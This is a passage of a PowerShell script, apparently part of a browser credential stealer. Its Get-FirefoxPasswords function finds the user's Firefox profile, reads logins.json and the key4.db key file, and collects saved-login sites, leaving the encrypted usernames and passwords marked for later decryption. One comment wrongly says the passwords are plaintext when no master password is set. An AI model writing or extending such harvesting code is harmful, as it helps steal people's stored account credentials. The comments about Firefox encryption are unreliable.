    return $output
}

# ================== FIREFOX (if no master PW) ==================
function Get-FirefoxPasswords {
    $output = "=== Firefox Saved Passwords ===`n"
    $profilesPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (-not (Test-Path $profilesPath)) {
        $output += "No Firefox profiles.`n"
        return $output
    }

    $profile = Get-ChildItem $profilesPath -Directory | Where-Object { $_.Name -like "*.default*" } | Select-Object -First 1
    if (-not $profile) {
        $output += "No default profile.`n"
        return $output
    }

    $loginsFile = Join-Path $profile.FullName "logins.json"
    $keyFile = Join-Path $profile.FullName "key4.db"  # or key3.db older

    if (-not (Test-Path $loginsFile)) {
        $output += "No logins.json.`n"
        return $output
    }

    $logins = Get-Content $loginsFile | ConvertFrom-Json
    foreach ($login in $logins.logins) {
        # If master PW set, this is encrypted and needs NSS_Decrypt (hard in pure PS)
        # If no master PW, passwords are plaintext in JSON (base64 decoded after decrypt with empty)
        $site = $login.hostname
        $user = $login.encryptedUsername  # base64, but decrypt needed
        $pass = $login.encryptedPassword

        # Pure PS decrypt is complex without NSS libs. Skip or note.
        $output += "Site: $site`nUser: [decryption needed]`nPass: [decryption needed]`n`n"
    }

    $output += "Firefox needs NSS or external tool for full decrypt if master PW.`n"
    return $output
}

